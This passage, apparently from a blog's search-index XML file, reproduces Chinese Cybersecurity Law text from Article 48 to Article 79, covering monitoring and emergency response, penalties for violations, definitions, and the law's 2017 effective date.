任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h3 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h3><p>第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h3 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h3><p>第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p>第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>第六十九条　网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h3 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章 附则"></a>第七章 附则</h3><p>第七十六条　本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>第七十九条　本法自2017年6月1日起施行。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全法</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
